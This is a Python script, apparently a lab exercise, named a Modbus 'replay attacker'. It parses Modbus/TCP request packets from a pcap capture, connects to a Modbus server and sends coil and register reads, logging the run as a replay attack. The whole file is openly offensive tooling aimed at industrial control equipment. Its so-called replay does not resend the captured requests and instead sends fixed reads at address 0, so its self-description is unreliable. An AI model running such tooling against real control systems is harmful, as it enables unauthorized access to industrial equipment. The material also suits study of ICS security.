import logging
import time
import os
from pymodbus.client import ModbusTcpClient
from scapy.all import rdpcap
from scapy.layers.inet import TCP
from tabulate import tabulate

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger()

class ModbusReplyAttacker:
    def __init__(self, target_ip="localhost", target_port=502):
        self.target_ip = target_ip
        self.target_port = target_port
        self.client = None

    def load_modbus_packets(self, pcap_file="ModbusTraffic.pcap"):
        """Reads and filters Modbus REQUEST packets from a pcap file."""
        logger.info("Loading packets from %s", pcap_file)
        packets = rdpcap(pcap_file)
        logger.info("Loaded %d packets", len(packets))

        modbus_request_packets = []
        packet_count = 0
        
        for packet in packets:
            if TCP in packet and packet[TCP].payload:
                raw_data = bytes(packet[TCP].payload)
                if len(raw_data) > 7:
                    parsed = self.parse_modbus_packet(raw_data)
                    if 1 <= parsed['function_code'] <= 4:
                        packet_count += 1
                        # Only keep request packets (odd-numbered in the sequence)
                        if packet_count % 2 == 1:
                            modbus_request_packets.append((parsed, raw_data))

        logger.info("Found %d Modbus request packets", len(modbus_request_packets))
        return modbus_request_packets

    def connect_to_target(self):
        """Establishes a connection to the target Modbus server."""
        self.client = ModbusTcpClient(host=self.target_ip, port=self.target_port)
        if not self.client.connect():
            logger.error("Failed to connect to target")
            return False
        return True

    def analyze_packets(self, modbus_packets):
        """Logs information about the extracted REQUEST packets."""
        logger.info("\nAnalyzing Modbus request packets:")
        for i, (parsed, raw_data) in enumerate(modbus_packets, 1):
            logger.info("Packet %d:", i)
            # Display direction and raw data
            logger.info("  Direction: Request")
            logger.info("  Raw Data: %s", raw_data.hex())

    def execute_replay(self, modbus_packets):
        """Replays the REQUEST packets to the Modbus server."""
        logger.info("\nReplaying Modbus request packets:")
        for i, (parsed, _) in enumerate(modbus_packets, 1):
            logger.info("\nReplaying packet %d", i)
            func_code = parsed['function_code']

            try:
                if func_code == 1:
                    response = self.client.read_coils(address=0, count=8)
                    logger.info("\nCoil Status Response:")
                elif func_code == 2:
                    response = self.client.read_discrete_inputs(address=0, count=8)
                    logger.info("\nDiscrete Input Status Response:")
                elif func_code == 3:
                    response = self.client.read_holding_registers(address=0, count=4)
                    logger.info("\nHolding Register Response:")
                elif func_code == 4:
                    response = self.client.read_input_registers(address=0, count=4)
                    logger.info("\nInput Register Response:")

                if response.isError():
                    logger.error("Error in response: %s", response)
                else:
                    logger.info("\n" + self.decode_response(func_code, response))
            except Exception as e:
                logger.error("Error during replay: %s", str(e))
            
            time.sleep(0.1)
        self.client.close()
        logger.info("\nReplay attack completed")

    def parse_modbus_packet(self, raw_data):
        """Parses raw Modbus packet data."""
        hex_data = raw_data.hex()
        return {
            'transaction_id': int(hex_data[0:4], 16),
            'protocol_id': int(hex_data[4:8], 16),
            'length': int(hex_data[8:12], 16),
            'unit_id': int(hex_data[12:14], 16),
            'function_code': int(hex_data[14:16], 16),
            'data': hex_data[16:]
        }

    def decode_response(self, function_code, response):
        """Decodes Modbus response based on function code."""
        if function_code in [1, 2]:
            if hasattr(response, 'bits'):
                bits = response.bits[:8]
                headers = ["Bit Position", "Status"]
                data = [[i, "ON" if bit else "OFF"] for i, bit in enumerate(bits)]
                return tabulate(data, headers=headers, tablefmt="grid")
        elif function_code in [3, 4]:
            if hasattr(response, 'registers'):
                headers = ["Register", "Value (Decimal)", "Value (Hex)"]
                data = [[i, val, f"0x{val:04X}"] for i, val in enumerate(response.registers)]
                return tabulate(data, headers=headers, tablefmt="grid")
        return "Unable to decode response"

if __name__ == "__main__":
    import sys
    if os.geteuid() != 0:
        logger.error("This script requires root privileges to replay packets")
        logger.error("Please run with sudo")
        sys.exit(1)
    
    attacker = ModbusReplyAttacker()
    modbus_packets = attacker.load_modbus_packets()
    if attacker.connect_to_target():
        attacker.analyze_packets(modbus_packets)
        attacker.execute_replay(modbus_packets)
    logger.info("Attack simulation completed")